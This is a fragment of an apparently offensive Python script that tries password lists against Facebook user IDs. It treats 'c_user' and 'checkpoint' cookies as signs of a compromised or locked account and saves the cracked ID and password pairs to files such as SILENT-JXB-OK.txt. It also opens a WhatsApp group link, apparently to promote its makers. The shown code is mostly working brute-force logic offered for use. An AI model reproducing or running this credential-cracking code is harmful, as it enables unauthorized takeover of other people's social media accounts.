...
os.system('xdg-open https://chat.whatsapp.com/Er8P6NsUAaQFzMPdE518YV')
os.system('xdg-open https://chat.whatsapp.com/Er8P6NsUAaQFzMPdE518YV')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KHAN G-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SILENT-JXB-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KHAN G-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SILENT-JXB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mDADA\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
